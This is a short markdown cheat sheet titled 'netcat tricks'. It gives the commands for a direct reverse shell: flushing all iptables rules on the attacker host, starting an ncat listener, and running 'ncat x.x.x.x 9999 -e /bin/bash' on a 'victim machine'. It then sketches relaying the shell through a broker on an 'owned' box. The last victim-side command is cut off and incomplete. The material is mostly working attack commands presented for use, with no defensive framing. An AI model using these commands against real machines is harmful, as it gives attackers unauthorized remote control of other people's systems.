---
title: "netcat tricks"
---

### Basic use of Netcat + CentOS Firewall Rules

For **direct reverse shell**:

```
|attacker machine|<------>|victim machine|
```

On "attackers machine" (vps, infra, blackhole), drop all iptables rules (dirty), and setup a connection listener:

```
$ sudo iptables -F
$ sudo ncat -nlvp 9999
```

On "victim machine" (target), connect to netcat listener:

```
$ ncat x.x.x.x 9999 -e /bin/bash
```

You should have a working remote shell n0w.

For **probe direct reverse shell**:

```
|attacker machine|<------>|attacker box|<------->|victime machine|
```

On "attackers box" (blackhole and/or owned boxes), drop all iptables rules (dirty), and setup a connection broker.

```
$ sudo iptables -F # => important!
$ sudo ncat --broker 9999 # => creates a broker for probing
```

On "attackers machine" (*see above*):

```
$ sudo ncat [attacker box] 9999
```

On "victim machine":

```
$ sudo ncat
```
